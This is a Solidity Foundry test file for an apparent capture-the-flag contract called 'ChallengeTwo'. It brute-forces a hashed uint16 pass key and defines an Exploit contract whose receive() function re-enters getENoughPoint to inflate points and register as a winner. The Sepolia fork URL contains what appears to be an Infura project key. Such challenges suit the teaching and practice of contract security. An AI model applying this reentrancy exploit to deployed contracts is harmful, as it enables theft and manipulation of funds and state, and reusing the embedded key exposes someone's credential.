// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity 0.8.13;

import "../src/ChallengeTwo.sol";
import {Test, console2} from "forge-std/Test.sol";

function findPassKey() pure returns (uint16) {
    for (uint16 i; i < type(uint16).max; ++i) {
        if (
            keccak256(abi.encode(i)) ==
            0xd8a1c3b3a94284f14146eb77d9b0decfe294c3ba72a437151caae86c3c8b2070
        ) {
            return i;
        }
    }
}

contract ChallengeTwoTest is Test {
    ChallengeTwo challenge;
    Exploit exploit;
    address user = makeAddr("user");

    // Precomputed valid key that will pass the passKey() check
    uint16 VALID_KEY;

    function setUp() public {
        challenge = new ChallengeTwo();
        exploit = new Exploit();
        VALID_KEY = findPassKey();
        // Setting up a local fork of the Sepolia testnet
        vm.createSelectFork(
            "https://sepolia.infura.io/v3/470bde729ff64363bedec5afe71f8d66"
        );
    }

    function testPassKeyWithValidKey() public {
        vm.startPrank(user);
        challenge.passKey(VALID_KEY);
        vm.stopPrank();
    }

    function testPassKeyWithInvalidKey() public {
        vm.startPrank(user);
        vm.expectRevert("invalid key");
        challenge.passKey(9999); // Some invalid key
        vm.stopPrank();
    }

    function testGetENoughPointWithoutReentrancy() public {
        vm.startPrank(user);
        challenge.passKey(VALID_KEY);

        // Try to complete level 2 without exploiting reentrancy
        vm.expectRevert("invalid point Accumulated");
        challenge.getENoughPoint("AMD");
        assertEq(challenge.userPoint(user), 0);
        vm.stopPrank();
    }

    function testReentrancyExploitOnGetEnoughPoint() public {
        // Using exploit contract to perform reentrancy attack
        vm.startPrank(user);
        exploit.passkey(address(challenge)); // Find and pass the key
        exploit.point(address(challenge)); // Trigger the exploit to accumulate points

        // Check if the exploit succeeded in bypassing the points check
        assertEq(challenge.userPoint(msg.sender), 4); // Ensure points are increased to 4 through reentrancy
        assertEq(challenge.Names(msg.sender), "AMD");
        vm.stopPrank();
    }

    function testAddYourNameWithExploit() public {
        vm.startPrank(user);
        exploit.passkey(address(challenge));
        exploit.point(address(challenge));
        exploit.add(address(challenge));
        assertEq(challenge.Names(msg.sender), "AMD");
        vm.stopPrank();
    }

    function testGetAllWinnersWithExploit() public {
        vm.startPrank(user);
        exploit.passkey(address(challenge));
        exploit.point(address(challenge));
        exploit.add(address(challenge));
        vm.stopPrank();

        // Confirm the exploiter is recorded as a winner
        string[] memory winners = challenge.getAllwiners();
        assertEq(winners[0], "AMD");
    }
}

contract Exploit {
    function passkey(address challengeAddress) public {
        uint16 passKey = findPassKey();
        ChallengeTwo(challengeAddress).passKey(passKey);
    }

    function point(address challengeAddress) external {
        ChallengeTwo(challengeAddress).getENoughPoint("AMD");
    }

    function add(address challengeAddress) external {
        ChallengeTwo(challengeAddress).addYourName();
    }

    uint count;

    receive() external payable {
        if (count != 3) {
            count++;
            ChallengeTwo(msg.sender).getENoughPoint("AMD");
        }
    }
}
